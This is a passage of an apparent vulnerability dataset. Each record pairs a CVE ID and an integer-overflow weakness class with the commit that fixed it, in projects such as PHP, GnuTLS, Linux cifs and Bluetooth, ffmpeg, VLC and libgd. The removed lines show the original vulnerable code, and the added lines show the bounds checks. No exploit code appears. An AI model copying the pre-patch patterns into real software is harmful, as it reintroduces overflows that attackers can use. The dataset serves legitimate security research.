b914db1..917734c 100644\n--- a\/ext\/phar\/tar.c\n+++ b\/ext\/phar\/tar.c\n@@ -38,7 +38,7 @@ static php_uint32 phar_tar_number(char *buf, int len) \/* {{{ *\/\n \/* }}} *\/\n \n \/* adapted from format_octal() in libarchive\n- * \n+ *\n  * Copyright (c) 2003-2009 Tim Kientzle\n  * All rights reserved.\n  *\n@@ -161,7 +161,7 @@ static int phar_tar_process_metadata(phar_entry_info *entry, php_stream *fp TSRM\n \tsize_t save = php_stream_tell(fp), read;\n \tphar_entry_info *mentry;\n \n-\tmetadata = (char *) emalloc(entry->uncompressed_filesize + 1);\n+\tmetadata = (char *) safe_emalloc(1, entry->uncompressed_filesize, 1);\n \n \tread = php_stream_read(fp, metadata, entry->uncompressed_filesize);\n \tif (read != entry->uncompressed_filesize) {\n@@ -377,7 +377,7 @@ bail:\n \t\t\t}\n \n \t\t\tread = php_stream_read(fp, buf, sizeof(buf));\n-\t\n+\n \t\t\tif (read != sizeof(buf)) {\n \t\t\t\tefree(entry.filename);\n \t\t\t\tif (error) {\n-- \n2.1.4\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-3479","CWE_ID":"189","category":"security","commit_id":"36fadd29849b8087af9f4586f89dbf74ea45be67","commit_message":"From 36fadd29849b8087af9f4586f89dbf74ea45be67 Mon Sep 17 00:00:00 2001\nFrom: Christos Zoulas <christos@zoulas.com>\nDate: Wed, 4 Jun 2014 17:26:07 +0000\nSubject: [PATCH] Use the proper sector size when checking stream offsets\n (Francisco Alonso and Jan Kaluza at RedHat)\n\n---\n src\/cdf.c | 8 +++++---\n 1 file changed, 5 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/src\/cdf.c b\/src\/cdf.c\nindex 6652581c2..0bfb31a22 100644\n--- a\/src\/cdf.c\n+++ b\/src\/cdf.c\n@@ -35,7 +35,7 @@\n #include \"file.h\"\n \n #ifndef lint\n-FILE_RCSID(\"@(#)$File: cdf.c,v 1.60 2014\/05\/21 13:04:38 christos Exp $\")\n+FILE_RCSID(\"@(#)$File: cdf.c,v 1.61 2014\/06\/04 17:23:19 christos Exp $\")\n #endif\n \n #include <assert.h>\n@@ -267,13 +267,15 @@ cdf_check_stream_offset(const cdf_stream_t *sst, const cdf_header_t *h,\n {\n \tconst char *b = (const char *)sst->sst_tab;\n \tconst char *e = ((const char *)p) + tail;\n+\tsize_t ss = sst->sst_dirlen < h->h_min_size_standard_stream ?\n+\t    CDF_SHORT_SEC_SIZE(h) : CDF_SEC_SIZE(h);\n \t(void)&line;\n-\tif (e >= b && (size_t)(e - b) <= CDF_SEC_SIZE(h) * sst->sst_len)\n+\tif (e >= b && (size_t)(e - b) <= ss * sst->sst_len)\n \t\treturn 0;\n \tDPRINTF((\"%d: offset begin %p < end %p || %\" SIZE_T_FORMAT \"u\"\n \t    \" > %\" SIZE_T_FORMAT \"u [%\" SIZE_T_FORMAT \"u %\"\n \t    SIZE_T_FORMAT \"u]\\n\", line, b, e, (size_t)(e - b),\n-\t    CDF_SEC_SIZE(h) * sst->sst_len, CDF_SEC_SIZE(h), sst->sst_len));\n+\t    ss * sst->sst_len, ss, sst->sst_len));\n \terrno = EFTYPE;\n \treturn -1;\n }\n","owner":"file","repo":"file","source":"cve"},{"CVE_ID":"CVE-2012-2674","CWE_ID":"189","category":"security","commit_id":"7f5aa4f35e23fd37425b3a5041737cdf58f87385","commit_message":"From 7f5aa4f35e23fd37425b3a5041737cdf58f87385 Mon Sep 17 00:00:00 2001\nFrom: Xi Wang <xi.wang@gmail.com>\nDate: Wed, 14 Mar 2012 02:48:39 -0400\nSubject: [PATCH] bionic: fix integer overflows in chk_malloc(), leak_malloc(),\n and leak_memalign()\n\nThe allocation size in chk_malloc(), leak_malloc(), and leak_memalign()\nfunctions may be rounded up to a small value, leading to buffer overflows.\nThe code only runs in debugging mode.\n\nThis patch complements commit 6f04a0f4 (CVE-2009-0607).\n\nChange-Id: Id899bcd2bcd2ea2205e5753c433390710032dc83\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\n---\n libc\/bionic\/malloc_debug_leak.c | 37 ++++++++++++++++++++++-----------\n 1 file changed, 25 insertions(+), 12 deletions(-)\n\n","diff_code":"diff --git a\/libc\/bionic\/malloc_debug_leak.c b\/libc\/bionic\/malloc_debug_leak.c\nindex e0bcee946c..e5845023d4 100644\n--- a\/libc\/bionic\/malloc_debug_leak.c\n+++ b\/libc\/bionic\/malloc_debug_leak.c\n@@ -25,26 +25,26 @@\n  * OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF\n  * SUCH DAMAGE.\n  *\/\n+\n+#include <dlfcn.h>\n #include <errno.h>\n+#include <fcntl.h>\n #include <pthread.h>\n+#include <stdarg.h>\n+#include <stddef.h>\n+#include <stdint.h>\n #include <stdio.h>\n-#include <arpa\/inet.h>\n-#include <sys\/socket.h>\n #include <stdlib.h>\n #include <string.h>\n #include <unistd.h>\n-#include <errno.h>\n-#include <stddef.h>\n-#include <stdarg.h>\n-#include <fcntl.h>\n #include <unwind.h>\n-#include <dlfcn.h>\n \n-#include <sys\/socket.h>\n-#include <sys\/un.h>\n+#include <arpa\/inet.h>\n #include <sys\/select.h>\n-#include <sys\/types.h>\n+#include <sys\/socket.h>\n #include <sys\/system_properties.h>\n+#include <sys\/types.h>\n+#include <sys\/un.h>\n \n #include \"dlmalloc.h\"\n #include \"logd.h\"\n@@ -372,7 +372,11 @@ static int chk_mem_check(void*       mem,\n \n void* chk_malloc(size_t bytes)\n {\n-    char* buffer = (char*)dlmalloc(bytes + CHK_OVERHEAD_SIZE);\n+    size_t size = bytes + CHK_OVERHEAD_SIZE;\n+    if (size < bytes) { \/\/ Overflow.\n+        return NULL;\n+    }\n+    uint8_t* buffer = (uint8_t*) dlmalloc(size);\n     if (buffer) {\n         memset(buffer, CHK_SENTINEL_VALUE, bytes + CHK_OVERHEAD_SIZE);\n         size_t offset = dlmalloc_usable_size(buffer) - sizeof(size_t);\n@@ -505,7 +509,12 @@ void* leak_malloc(size_t bytes)\n     \/\/ 1. allocate enough memory and include our header\n     \/\/ 2. set the base pointer to be right after our header\n \n-    void* base = dlmalloc(bytes + sizeof(AllocationEntry));\n+    size_t size = bytes + sizeof(AllocationEntry);\n+    if (size < bytes) { \/\/ Overflow.\n+        return NULL;\n+    }\n+\n+    void* base = dlmalloc(size);\n     if (base != NULL) {\n         pthread_mutex_lock(&gAllocationsMutex);\n \n@@ -615,6 +624,10 @@ void* leak_memalign(size_t alignment, size_t bytes)\n     \/\/ we will align by at least MALLOC_ALIGNMENT bytes\n     \/\/ and at most alignment-MALLOC_ALIGNMENT bytes\n     size_t size = (alignment-MALLOC_ALIGNMENT) + bytes;\n+    if (size < bytes) { \/\/ Overflow.\n+        return NULL;\n+    }\n+\n     void* base = leak_malloc(size);\n     if (base != NULL) {\n         intptr_t ptr = (intptr_t)base;\n","owner":"android","repo":"platform_bionic","source":"cve"},{"CVE_ID":"CVE-2010-2643","CWE_ID":"189","category":"security","commit_id":"d4139205b010ed06310d14284e63114e88ec6de2","commit_message":"From d4139205b010ed06310d14284e63114e88ec6de2 Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?Jos=C3=A9=20Aliste?= <jaliste@src.gnome.org>\nDate: Tue, 7 Dec 2010 15:56:47 -0300\nSubject: [PATCH] backends: Fix several security issues in the dvi-backend.\n\nSee CVE-2010-2640, CVE-2010-2641, CVE-2010-2642 and  CVE-2010-2643.\n---\n backend\/dvi\/mdvi-lib\/afmparse.c |  2 +-\n backend\/dvi\/mdvi-lib\/dviread.c  |  4 ++++\n backend\/dvi\/mdvi-lib\/pk.c       | 11 ++++++++++-\n backend\/dvi\/mdvi-lib\/tfmfile.c  |  3 ++-\n backend\/dvi\/mdvi-lib\/vf.c       |  6 ++++++\n 5 files changed, 23 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/backend\/dvi\/mdvi-lib\/afmparse.c b\/backend\/dvi\/mdvi-lib\/afmparse.c\nindex 164366b0..361e23d6 100644\n--- a\/backend\/dvi\/mdvi-lib\/afmparse.c\n+++ b\/backend\/dvi\/mdvi-lib\/afmparse.c\n@@ -160,7 +160,7 @@ static char *token(FILE *stream)\n     \n     idx = 0;\n     while (ch != EOF && ch != ' ' && ch != lineterm \n-           && ch != '\\t' && ch != ':' && ch != ';') \n+           && ch != '\\t' && ch != ':' && ch != ';' && idx < MAX_NAME)\n     {\n         ident[idx++] = ch;\n         ch = fgetc(stream);\ndiff --git a\/backend\/dvi\/mdvi-lib\/dviread.c b\/backend\/dvi\/mdvi-lib\/dviread.c\nindex cd8cfa91..d0143205 100644\n--- a\/backend\/dvi\/mdvi-lib\/dviread.c\n+++ b\/backend\/dvi\/mdvi-lib\/dviread.c\n@@ -1507,6 +1507,10 @@ int\tspecial(DviContext *dvi, int opcode)\n \tInt32\targ;\n \t\n \targ = dugetn(dvi, opcode - DVI_XXX1 + 1);\n+\tif (arg <= 0) {\n+\t\tdvierr(dvi, _(\"malformed special length\\n\"));\n+\t\treturn -1;\n+\t}\n \ts = mdvi_malloc(arg + 1);\n \tdread(dvi, s, arg);\n \ts[arg] = 0;\ndiff --git a\/backend\/dvi\/mdvi-lib\/pk.c b\/backend\/dvi\/mdvi-lib\/pk.c\nindex a5791869..08377e63 100644\n--- a\/backend\/dvi\/mdvi-lib\/pk.c\n+++ b\/backend\/dvi\/mdvi-lib\/pk.c\n@@ -469,6 +469,15 @@ static int pk_load_font(DviParams *unused, DviFont *font)\n \t\t\t}\n \t\t\tif(feof(p))\n \t\t\t\tbreak;\n+\n+\t\t\t\/* Although the PK format support bigger char codes,\n+                         * XeTeX and other extended TeX engines support charcodes up to\n+                         * 65536, while normal TeX engine supports only charcode up to 255.*\/\n+\t\t\tif (cc < 0 || cc > 65536) {\n+\t\t\t\tmdvi_error (_(\"%s: unexpected charcode (%d)\\n\"),\n+\t\t\t\t\t    font->fontname,cc);\n+\t\t\t\tgoto error;\n+\t\t\t} \n \t\t\tif(cc < loc)\n \t\t\t\tloc = cc;\n \t\t\tif(cc > hic)\n@@ -512,7 +521,7 @@ static int pk_load_font(DviParams *unused, DviFont *font)\n \t}\n \n \t\/* resize font char data *\/\n-\tif(loc > 0 || hic < maxch-1) {\n+\tif(loc > 0 && hic < maxch-1) {\n \t\tmemmove(font->chars, font->chars + loc, \n \t\t\t(hic - loc + 1) * sizeof(DviFontChar));\n \t\tfont->chars = xresize(font->chars,\ndiff --git a\/backend\/dvi\/mdvi-lib\/tfmfile.c b\/backend\/dvi\/mdvi-lib\/tfmfile.c\nindex 73ebf26a..8c2a30b2 100644\n--- a\/backend\/dvi\/mdvi-lib\/tfmfile.c\n+++ b\/backend\/dvi\/mdvi-lib\/tfmfile.c\n@@ -172,7 +172,8 @@ int\ttfm_load_file(const char *filename, TFMInfo *info)\n \t\/* We read the entire TFM file into core *\/\n \tif(fstat(fileno(in), &st) < 0)\n \t\treturn -1;\n-\tif(st.st_size == 0)\n+\t\/* according to the spec, TFM files are smaller than 16K *\/\n+\tif(st.st_size == 0 || st.st_size >= 16384)\n \t\tgoto bad_tfm;\n \n \t\/* allocate a word-aligned buffer to hold the file *\/\ndiff --git a\/backend\/dvi\/mdvi-lib\/vf.c b\/backend\/dvi\/mdvi-lib\/vf.c\nindex fb498476..a5ae3bbe 100644\n--- a\/backend\/dvi\/mdvi-lib\/vf.c\n+++ b\/backend\/dvi\/mdvi-lib\/vf.c\n@@ -165,6 +165,12 @@ static int vf_load_font(DviParams *params, DviFont *font)\n \t\t\tcc = fuget1(p);\n \t\t\ttfm = fuget3(p);\n \t\t}\n+\t\tif (cc < 0 || cc > 65536) {\n+\t\t\t\/* TeX engines do not support char codes bigger than 65535 *\/\n+\t\t\tmdvi_error(_(\"(vf) %s: unexpected character %d\\n\"),\n+\t\t\t\t   font->fontname, cc);\n+\t\t\tgoto error;\n+\t\t}\n \t\tif(loc < 0 || cc < loc)\n \t\t\tloc = cc;\n \t\tif(hic < 0 || cc > hic)\n-- \n2.21.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-4247","CWE_ID":"189","category":"security","commit_id":"1fc29bacedeabb278080e31bb9c1ecb49f143c3b","commit_message":"From 1fc29bacedeabb278080e31bb9c1ecb49f143c3b Mon Sep 17 00:00:00 2001\nFrom: Jeff Layton <jlayton@redhat.com>\nDate: Fri, 31 May 2013 10:00:18 -0400\nSubject: cifs: fix off-by-one bug in build_unc_path_to_root\n\ncommit 839db3d10a (cifs: fix up handling of prefixpath= option) changed\nthe code such that the vol->prepath no longer contained a leading\ndelimiter and then fixed up the places that accessed that field to\naccount for that change.\n\nOne spot in build_unc_path_to_root was missed however. When doing the\npointer addition on pos, that patch failed to account for the fact that\nwe had already incremented \"pos\" by one when adding the length of the\nprepath. This caused a buffer overrun by one byte.\n\nThis patch fixes the problem by correcting the handling of \"pos\".\n\nCc: <stable@vger.kernel.org> # v3.8+\nReported-by: Marcus Moeller <marcus.moeller@gmx.ch>\nReported-by: Ken Fallon <ken.fallon@gmail.com>\nSigned-off-by: Jeff Layton <jlayton@redhat.com>\nSigned-off-by: Steve French <sfrench@us.ibm.com>\n---\n fs\/cifs\/connect.c | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/fs\/cifs\/connect.c b\/fs\/cifs\/connect.c\nindex 5b97e56ddbca..e3bc39bb9d12 100644\n--- a\/fs\/cifs\/connect.c\n+++ b\/fs\/cifs\/connect.c\n@@ -3279,8 +3279,8 @@ build_unc_path_to_root(const struct smb_vol *vol,\n \tpos = full_path + unc_len;\n \n \tif (pplen) {\n-\t\t*pos++ = CIFS_DIR_SEP(cifs_sb);\n-\t\tstrncpy(pos, vol->prepath, pplen);\n+\t\t*pos = CIFS_DIR_SEP(cifs_sb);\n+\t\tstrncpy(pos + 1, vol->prepath, pplen);\n \t\tpos += pplen;\n \t}\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2013-0875","CWE_ID":"189","category":"security","commit_id":"1ac0fa50eff30d413206cffa5f47f7fe6d4849b1","commit_message":"From 1ac0fa50eff30d413206cffa5f47f7fe6d4849b1 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Tue, 12 Feb 2013 19:53:40 +0100\nSubject: [PATCH] pngdec\/filter: dont access out of array elements at the end\n\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/pngdec.c | 12 ++++--------\n 1 file changed, 4 insertions(+), 8 deletions(-)\n\n","diff_code":"diff --git a\/libavcodec\/pngdec.c b\/libavcodec\/pngdec.c\nindex 97c0ad19b6..193e35e591 100644\n--- a\/libavcodec\/pngdec.c\n+++ b\/libavcodec\/pngdec.c\n@@ -190,7 +190,7 @@ void ff_add_png_paeth_prediction(uint8_t *dst, uint8_t *src, uint8_t *top, int w\n     if(bpp >= 2) g = dst[1];\\\n     if(bpp >= 3) b = dst[2];\\\n     if(bpp >= 4) a = dst[3];\\\n-    for(; i < size; i+=bpp) {\\\n+    for(; i <= size - bpp; i+=bpp) {\\\n         dst[i+0] = r = op(r, src[i+0], last[i+0]);\\\n         if(bpp == 1) continue;\\\n         dst[i+1] = g = op(g, src[i+1], last[i+1]);\\\n@@ -206,13 +206,9 @@ void ff_add_png_paeth_prediction(uint8_t *dst, uint8_t *src, uint8_t *top, int w\n     else if(bpp == 2) UNROLL1(2, op)\\\n     else if(bpp == 3) UNROLL1(3, op)\\\n     else if(bpp == 4) UNROLL1(4, op)\\\n-    else {\\\n-        for (; i < size; i += bpp) {\\\n-            int j;\\\n-            for (j = 0; j < bpp; j++)\\\n-                dst[i+j] = op(dst[i+j-bpp], src[i+j], last[i+j]);\\\n-        }\\\n-    }\n+    for (; i < size; i++) {\\\n+        dst[i] = op(dst[i-bpp], src[i], last[i]);\\\n+    }\\\n \n \/* NOTE: 'dst' can be equal to 'last' *\/\n static void png_filter_row(PNGDSPContext *dsp, uint8_t *dst, int filter_type,\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2008-1950","CWE_ID":"189","category":"security","commit_id":"bc8102405fda11ea00ca3b42acc4f4bce9d6e97b","commit_message":"From bc8102405fda11ea00ca3b42acc4f4bce9d6e97b Mon Sep 17 00:00:00 2001\nFrom: Simon Josefsson <simon@josefsson.org>\nDate: Mon, 19 May 2008 10:34:08 +0200\nSubject: [PATCH] Fix GNUTLS-SA-2008-1 security vulnerabilities. See\n http:\/\/www.gnu.org\/software\/gnutls\/security.html for updates.\n\n---\n lib\/ext_server_name.c  | 27 ++++++++++++++++++++-------\n lib\/gnutls_cipher.c    | 14 +++++++++++---\n lib\/gnutls_handshake.c |  8 ++++++++\n 3 files changed, 39 insertions(+), 10 deletions(-)\n\n","diff_code":"diff --git a\/lib\/ext_server_name.c b\/lib\/ext_server_name.c\nindex 72e42ff..a2db949 100644\n--- a\/lib\/ext_server_name.c\n+++ b\/lib\/ext_server_name.c\n@@ -74,10 +74,27 @@ _gnutls_server_name_recv_params (gnutls_session_t session,\n \t  len = _gnutls_read_uint16 (p);\n \t  p += 2;\n \n-\t  DECR_LENGTH_RET (data_size, len, 0);\n-\t  server_names++;\n+\t  if (len > 0)\n+\t    {\n+\t      DECR_LENGTH_RET (data_size, len, 0);\n+\t      server_names++;\n+\t      p += len;\n+\t    }\n+\t  else\n+\t    _gnutls_handshake_log\n+\t      (\"HSK[%x]: Received zero size server name (under attack?)\\n\",\n+\t       session);\n \n-\t  p += len;\n+\t}\n+\n+      \/* we cannot accept more server names.\n+       *\/\n+      if (server_names > MAX_SERVER_NAME_EXTENSIONS)\n+\t{\n+\t  _gnutls_handshake_log\n+\t    (\"HSK[%x]: Too many server names received (under attack?)\\n\",\n+\t     session);\n+\t  server_names = MAX_SERVER_NAME_EXTENSIONS;\n \t}\n \n       session->security_parameters.extensions.server_names_size =\n@@ -85,10 +102,6 @@ _gnutls_server_name_recv_params (gnutls_session_t session,\n       if (server_names == 0)\n \treturn 0;\t\t\/* no names found *\/\n \n-      \/* we cannot accept more server names.\n-       *\/\n-      if (server_names > MAX_SERVER_NAME_EXTENSIONS)\n-\tserver_names = MAX_SERVER_NAME_EXTENSIONS;\n \n       p = data + 2;\n       for (i = 0; i < server_names; i++)\ndiff --git a\/lib\/gnutls_cipher.c b\/lib\/gnutls_cipher.c\nindex ad192f4..778402a 100644\n--- a\/lib\/gnutls_cipher.c\n+++ b\/lib\/gnutls_cipher.c\n@@ -459,6 +459,14 @@ _gnutls_ciphertext2compressed (gnutls_session_t session,\n       return GNUTLS_E_INTERNAL_ERROR;\n     }\n \n+  if (ciphertext.size < (unsigned) blocksize + hash_size)\n+    {\n+      _gnutls_record_log\n+\t(\"REC[%x]: Short record length %d < %d + %d (under attack?)\\n\",\n+\t session, ciphertext.size, blocksize, hash_size);\n+      gnutls_assert ();\n+      return GNUTLS_E_DECRYPTION_FAILED;\n+    }\n \n   \/* actual decryption (inplace)\n    *\/\n@@ -510,9 +518,7 @@ _gnutls_ciphertext2compressed (gnutls_session_t session,\n \n       pad = ciphertext.data[ciphertext.size - 1] + 1;\t\/* pad *\/\n \n-      length = ciphertext.size - hash_size - pad;\n-\n-      if (pad > ciphertext.size - hash_size)\n+      if ((int)pad > (int)ciphertext.size - hash_size)\n \t{\n \t  gnutls_assert ();\n \t  \/* We do not fail here. We check below for the\n@@ -521,6 +527,8 @@ _gnutls_ciphertext2compressed (gnutls_session_t session,\n \t  pad_failed = GNUTLS_E_DECRYPTION_FAILED;\n \t}\n \n+      length = ciphertext.size - hash_size - pad;\n+\n       \/* Check the pading bytes (TLS 1.x)\n        *\/\n       if (ver >= GNUTLS_TLS1 && pad_failed == 0)\ndiff --git a\/lib\/gnutls_handshake.c b\/lib\/gnutls_handshake.c\nindex 4ab6db6..d798180 100644\n--- a\/lib\/gnutls_handshake.c\n+++ b\/lib\/gnutls_handshake.c\n@@ -1003,6 +1003,14 @@ _gnutls_recv_handshake_header (gnutls_session_t session,\n \n       *recv_type = session->internals.handshake_header_buffer.recv_type;\n \n+      if (*recv_type != type)\n+\t{\n+\t  gnutls_assert ();\n+\t  _gnutls_handshake_log\n+\t    (\"HSK[%x]: Handshake type mismatch (under attack?)\\n\", session);\n+\t  return GNUTLS_E_UNEXPECTED_HANDSHAKE_PACKET;\n+\t}\n+\n       return session->internals.handshake_header_buffer.packet_length;\n     }\n \n-- \n1.9.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-2497","CWE_ID":"189","category":"security","commit_id":"7ac28817536797fd40e9646452183606f9e17f71","commit_message":"From 7ac28817536797fd40e9646452183606f9e17f71 Mon Sep 17 00:00:00 2001\nFrom: Dan Rosenberg <drosenberg@vsecurity.com>\nDate: Fri, 24 Jun 2011 08:38:05 -0400\nSubject: Bluetooth: Prevent buffer overflow in l2cap config request\n\nA remote user can provide a small value for the command size field in\nthe command header of an l2cap configuration request, resulting in an\ninteger underflow when subtracting the size of the configuration request\nheader.  This results in copying a very large amount of data via\nmemcpy() and destroying the kernel heap.  Check for underflow.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nCc: stable <stable@kernel.org>\nSigned-off-by: Gustavo F. Padovan <padovan@profusion.mobi>\n---\n net\/bluetooth\/l2cap_core.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/net\/bluetooth\/l2cap_core.c b\/net\/bluetooth\/l2cap_core.c\nindex 56fdd9162da9..7d8a66b04f50 100644\n--- a\/net\/bluetooth\/l2cap_core.c\n+++ b\/net\/bluetooth\/l2cap_core.c\n@@ -2334,7 +2334,7 @@ static inline int l2cap_config_req(struct l2cap_conn *conn, struct l2cap_cmd_hdr\n \n \t\/* Reject if config buffer is too small. *\/\n \tlen = cmd_len - sizeof(*req);\n-\tif (chan->conf_len + len > sizeof(chan->conf_req)) {\n+\tif (len < 0 || chan->conf_len + len > sizeof(chan->conf_req)) {\n \t\tl2cap_send_cmd(conn, cmd->ident, L2CAP_CONF_RSP,\n \t\t\t\tl2cap_build_conf_rsp(chan, rsp,\n \t\t\t\t\tL2CAP_CONF_REJECT, flags), rsp);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2008-4686","CWE_ID":"189","category":"security","commit_id":"d859e6b9537af2d7326276f70de25a840f554dc3","commit_message":"From d859e6b9537af2d7326276f70de25a840f554dc3 Mon Sep 17 00:00:00 2001\nFrom: =?utf8?q?R=C3=A9mi=20Denis-Courmont?= <rdenis@simphalempin.com>\nDate: Sun, 19 Oct 2008 12:26:23 +0300\nSubject: [PATCH] Fix some integer overflows and a stupid memset() invocation\n\n---\n modules\/demux\/ty.c | 28 +++++++++++++++++-----------\n 1 file changed, 17 insertions(+), 11 deletions(-)\n\n","diff_code":"diff --git a\/modules\/demux\/ty.c b\/modules\/demux\/ty.c\nindex 49d7ab61e3..11511b4ff9 100644\n--- a\/modules\/demux\/ty.c\n+++ b\/modules\/demux\/ty.c\n@@ -241,8 +241,8 @@ struct demux_sys_t\n   \/\/mtime_t         l_last_ty_pts_sync; \/* audio PTS at time of last TY PTS *\/\n   uint64_t        l_first_ty_pts;     \/* first TY PTS in this master chunk *\/\n   uint64_t        l_final_ty_pts;     \/* final TY PTS in this master chunk *\/\n-  int             i_seq_table_size;   \/* number of entries in SEQ table *\/\n-  int             i_bits_per_seq_entry; \/* # of bits in SEQ table bitmask *\/\n+  unsigned        i_seq_table_size;   \/* number of entries in SEQ table *\/\n+  unsigned        i_bits_per_seq_entry; \/* # of bits in SEQ table bitmask *\/\n \n   mtime_t         firstAudioPTS;\n   mtime_t         lastAudioPTS;\n@@ -1051,8 +1051,9 @@ static int ty_stream_seek_pct(demux_t *p_demux, double seek_pct)\n {\n     demux_sys_t *p_sys = p_demux->p_sys;\n     int64_t seek_pos = p_sys->i_stream_size * seek_pct;\n-    int i, i_cur_part;\n     long l_skip_amt;\n+    int i;\n+    unsigned i_cur_part;\n \n     \/* if we're not seekable, there's nothing to do *\/\n     if (!p_sys->b_seekable)\n@@ -1472,10 +1473,11 @@ static void DemuxDecodeXds( demux_t *p_demux, uint8_t d1, uint8_t d2 )\n static int ty_stream_seek_time(demux_t *p_demux, uint64_t l_seek_time)\n {\n     demux_sys_t *p_sys = p_demux->p_sys;\n-    int i, i_seq_entry = 0;\n+    int i_seq_entry = 0;\n     int i_skip_cnt;\n+    unsigned i;\n     long l_cur_pos = stream_Tell(p_demux->s);\n-    int i_cur_part = l_cur_pos \/ TIVO_PART_LENGTH;\n+    unsigned i_cur_part = l_cur_pos \/ TIVO_PART_LENGTH;\n     long l_seek_secs = l_seek_time \/ 1000000000;\n     uint64_t l_fwd_stamp = 1;\n \n@@ -1598,8 +1600,8 @@ static int ty_stream_seek_time(demux_t *p_demux, uint64_t l_seek_time)\n        so we need to skip past any stream data prior to the seq_rec\n        in this chunk *\/\n     i_skip_cnt = 0;\n-    for (i=0; i<p_sys->i_seq_rec; i++)\n-        i_skip_cnt += p_sys->rec_hdrs[i].l_rec_size;\n+    for (int j=0; j<p_sys->i_seq_rec; j++)\n+        i_skip_cnt += p_sys->rec_hdrs[j].l_rec_size;\n     stream_Read(p_demux->s, NULL, i_skip_cnt);\n     p_sys->i_cur_rec = p_sys->i_seq_rec;\n     \/\/p_sys->l_last_ty_pts = p_sys->rec_hdrs[p_sys->i_seq_rec].l_ty_pts;\n@@ -1616,7 +1618,7 @@ static void parse_master(demux_t *p_demux)\n {\n     demux_sys_t *p_sys = p_demux->p_sys;\n     uint8_t mst_buf[32];\n-    int i, i_map_size;\n+    uint32_t i, i_map_size;\n     int64_t i_save_pos = stream_Tell(p_demux->s);\n     int64_t i_pts_secs;\n \n@@ -1637,14 +1639,18 @@ static void parse_master(demux_t *p_demux)\n     p_sys->i_seq_table_size = i \/ (8 + i_map_size);\n \n     \/* parse all the entries *\/\n-    p_sys->seq_table = malloc(p_sys->i_seq_table_size * sizeof(ty_seq_table_t));\n-    for (i=0; i<p_sys->i_seq_table_size; i++) {\n+    p_sys->seq_table = calloc(p_sys->i_seq_table_size, sizeof(ty_seq_table_t));\n+    if (p_sys->seq_table == NULL)\n+    {\n+        p_sys->i_seq_table_size = 0;\n+        return;\n+    }\n+    for (unsigned i=0; i<p_sys->i_seq_table_size; i++) {\n         stream_Read(p_demux->s, mst_buf, 8);\n         p_sys->seq_table[i].l_timestamp = U64_AT(&mst_buf[0]);\n         if (i_map_size > 8) {\n             msg_Err(p_demux, \"Unsupported SEQ bitmap size in master chunk\");\n             stream_Read(p_demux->s, NULL, i_map_size);\n-            memset(p_sys->seq_table[i].chunk_bitmask, i_map_size, 0);\n         } else {\n             stream_Read(p_demux->s, mst_buf + 8, i_map_size);\n             memcpy(p_sys->seq_table[i].chunk_bitmask, &mst_buf[8], i_map_size);\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-7327","CWE_ID":"189","category":"security","commit_id":"8f4a5373bb71590352fd934028d6dde5bc18530b","commit_message":"From 8f4a5373bb71590352fd934028d6dde5bc18530b Mon Sep 17 00:00:00 2001\nFrom: Remi Collet <remi@php.net>\nDate: Sat, 28 Dec 2013 14:22:13 +0100\nSubject: [PATCH] Fixed bug #66356 (Heap Overflow Vulnerability in imagecrop())\n\nInitial fix was PHP stuff\nThis one is libgd fix.\n\n- filter invalid crop size\n- dont try to copy on invalid position\n- fix crop size when out of src image\n- fix possible NULL deref\n- fix possible integer overfloow\n---\n NEWS                       |  3 ++-\n ext\/gd\/libgd\/gd_crop.c     | 52 ++++++++++++++++++++++++++++------------------\n ext\/gd\/tests\/bug66356.phpt | 22 ++++++++++++++++++--\n 3 files changed, 54 insertions(+), 23 deletions(-)\n\n","diff_code":"diff --git a\/NEWS b\/NEWS\nindex 86eeb7c..aed16cc 100644\n--- a\/NEWS\n+++ b\/NEWS\n@@ -29,7 +29,8 @@ PHP                                                                        NEWS\n   . Fixed bug #66229 (128.0.0.0\/16 isn't reserved any longer). (Adam)\n \n - GD:\n-  . Fixed bug #66356 (Heap Overflow Vulnerability in imagecrop()). (Laruence)\n+  . Fixed bug #66356 (Heap Overflow Vulnerability in imagecrop()).\n+    (Laruence, Remi)\n   . Fixed bug #64405 (Use freetype-config for determining freetype2 dir(s)).\n     (Adam)\n     \ndiff --git a\/ext\/gd\/libgd\/gd_crop.c b\/ext\/gd\/libgd\/gd_crop.c\nindex f0b888a..90a99a6 100644\n--- a\/ext\/gd\/libgd\/gd_crop.c\n+++ b\/ext\/gd\/libgd\/gd_crop.c\n@@ -44,6 +44,12 @@ gdImagePtr gdImageCrop(gdImagePtr src, const gdRectPtr crop)\n {\n \tgdImagePtr dst;\n \n+\t\/* check size *\/\n+\tif (crop->width<=0 || crop->height<=0) {\n+\t\treturn NULL;\n+\t}\n+\n+\t\/* allocate the requested size (could be only partially filled) *\/\n \tif (src->trueColor) {\n \t\tdst = gdImageCreateTrueColor(crop->width, crop->height);\n \t\tgdImageSaveAlpha(dst, 1);\n@@ -51,37 +57,43 @@ gdImagePtr gdImageCrop(gdImagePtr src, const gdRectPtr crop)\n \t\tdst = gdImageCreate(crop->width, crop->height);\n \t\tgdImagePaletteCopy(dst, src);\n \t}\n+\tif (dst == NULL) {\n+\t\treturn NULL;\n+\t}\n \tdst->transparent = src->transparent;\n \n-\tif (src->sx < (crop->x + 